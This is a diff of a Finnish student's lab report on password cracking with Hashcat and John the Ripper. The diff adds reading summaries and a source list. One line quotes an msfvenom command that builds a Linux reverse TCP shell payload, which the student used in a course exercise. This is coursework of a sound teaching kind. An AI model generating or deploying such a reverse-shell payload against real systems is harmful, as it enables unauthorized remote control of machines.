@@ -6,8 +6,29 @@ Tehtävässä h4 tuli harjoitella salasanojen murtamista tiivisteistä, jota kä
 
 ## Ennakkomateriaalit
 
+Artikkelit "Cracking Passwords with Hashcat" ja "Crack File Password With John" sisälsivät ohjeita kyseisten ohjelmien lataamiseen ja käyttöön. Hyödynsin molempia kohdissa A-B ja E-F, joissa näitä ohjelmia käytettiin.
+
+O'Reillyn videosarjassa käytiin läpi käyttäjien tunnuksiin kohdistuvia hyökkäyksiä. Tärkeitä huomioita ovat;
+
+-Tunnuksiä säilytetään yleensä eri tietokannoissa kuten SQL
+
+-Tunnuksia tietokannoissa suojataan yleensä tiivisteillä
+
+-Tiiviste-algorytmeja on onnistuttu murtaa viimevuosina laskentatehon ja uusien metodien avulla
+
+-Parempien tiivisteiden lisäksi tarvitaan salasanojen turvallisempaa säilömistä ja parempia salasanoja
+
+Kohdassa G hyödynsin MSFVenom CheatSheetin komentoa `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf`, jolla sain `reverse shell` -yhteyden toimimaan.
+
 ### Lähteet
-https://terokarvinen.com/2022/cracking-passwords-with-hashcat/
+
+Karvinen 2023: Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/. Luettu 26.11.2024
+
+Karvinen 2023: Crack File Password With John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/. Luettu 26.11.2024
+
+Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials. Luettavissa: https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00. Luettu 26.11.2024
+
+MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom. Luettu 26.11.2024
 
 ## Hashcat (Kohta A)
 
